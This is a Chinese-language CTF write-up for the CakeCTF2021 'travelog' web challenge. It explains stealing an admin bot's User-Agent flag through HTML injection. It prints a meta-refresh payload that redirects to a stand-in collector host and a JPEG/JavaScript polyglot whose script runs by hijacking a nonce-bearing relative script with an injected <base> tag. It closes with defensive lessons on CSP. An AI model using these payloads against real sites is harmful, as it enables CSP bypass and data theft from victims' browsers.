# CakeCTF2021 travelog

## 题目简述

用户文章内容以 Jinja `safe` 方式原样插入页面，管理员 bot 会访问举报文章，并把 flag 设置为浏览器 User-Agent。页面配置了 nonce CSP，表面上会阻止普通内联脚本。由于目标只是让 bot 向外部站点发起导航，最短解法是注入 `meta refresh`；仓库官方解法还展示了一条更完整的 JPEG/JavaScript polyglot 与 `<base>` CSP 绕过链。

## 解题过程

### 最短路径：meta refresh 泄露 User-Agent

文章正文可直接包含标签：

```html
<meta http-equiv="refresh"
      content="0;url=https://collector.example/travelog">
```

题目的 CSP 限制脚本、样式、图片、连接和 base URI，却没有有效限制顶层导航。bot 打开文章后立即跳转到收集端；HTTP 请求天然携带 bot 的 User-Agent，因此收集端日志直接出现 flag：

```text
CakeCTF{CSP_1s_n0t_4_s1lv3r_bull3t!_bang!_bang!}
```

创建文章后，把页面中的 `/post/<user_id>/<post_id>` 路径提交给 `/report`，等待 bot 访问即可。真实复现时收集端必须是自己控制的服务，不应使用他人的公开端点。

### 想定路径：劫持带 nonce 的外部脚本

官方解法利用上传接口只靠 `imghdr` 检查 JPEG。构造名为 `show_utils.js` 的 polyglot：

```javascript
nyan/*JFIF*/=1;location.href="https://collector.example/travelog";
```

`JFIF` 恰位于字节偏移 6，能通过 JPEG 检查；对 JavaScript 而言它处于注释中，整段仍可执行。

文章模板末尾有带正确 nonce 的相对脚本：

```html
<script nonce="..." src="../../show_utils.js"></script>
```

再在文章中注入同源 base：

```html
<base href="/uploads/USER_ID/XXX/YYY/">
```

相对路径 `../../show_utils.js` 会解析为 `/uploads/USER_ID/show_utils.js`，正好加载上传的 polyglot。脚本标签本身拥有服务器生成的 nonce，所以通过 `script-src`；执行后导航到收集端，同样通过请求 User-Agent 泄露 flag。

## 方法总结

- CSP 主要限制资源加载和脚本执行，不应被当作 HTML 注入的通用修复；导航、表单等通道仍需单独审计。
- `<base>` 能改变页面中既有相对 URL 的含义，`base-uri 'self'` 仍允许攻击者选择任意同源基址。
- JPEG 魔数检查只证明文件头像图片，不证明整个文件不能被另一种解析器当作脚本。
